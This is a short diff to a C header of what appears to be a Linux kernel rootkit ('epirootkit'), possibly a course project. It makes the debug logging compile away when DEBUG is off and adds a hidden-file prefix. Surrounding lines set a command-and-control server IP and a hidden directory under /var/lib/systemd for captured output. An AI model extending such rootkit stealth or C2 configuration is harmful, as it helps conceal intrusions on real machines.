@@ -7,19 +7,20 @@
 
 // LOG MACROS
 #define DEBUG 1
+#if DEBUG
 #define DBG_MSG(fmt, args...) 								\
 	do { 													\
-		if (DEBUG) { 										\
-			pr_info("epirootkit: " fmt, ##args); 		    \
-		} 													\
+		pr_info("epirootkit: " fmt, ##args); 		    	\
 	} while (0)
 
 #define ERR_MSG(fmt, args...) 								\
 	do { 													\
-		if (DEBUG) { 										\
-			pr_err("epirootkit: " fmt, ##args); 		    \
-		} 													\
+		pr_err("epirootkit: " fmt, ##args); 		    	\
 	} while (0)
+#else
+#define DBG_MSG(fmt, args...) do { } while (0)
+#define ERR_MSG(fmt, args...) do { } while (0)
+#endif
 
 // PARAMETERS MACROS
 #define SERVER_IP "192.168.100.1" // TO ADAPT
@@ -57,6 +58,7 @@ enum Protocol {
 #define USERLAND_CMD_TIMEOUT 5
 
 // HIDDEN FILES MACROS
+#define HIDDEN_PREFIX "stdbool_bypassed_ngl_"
 #define HIDDEN_DIR_NAME ".epirootkit-hidden-fs"
 #define HIDDEN_DIR_PATH "/var/lib/systemd/" HIDDEN_DIR_NAME
 #define STDOUT_FILE HIDDEN_DIR_PATH "/std.out"
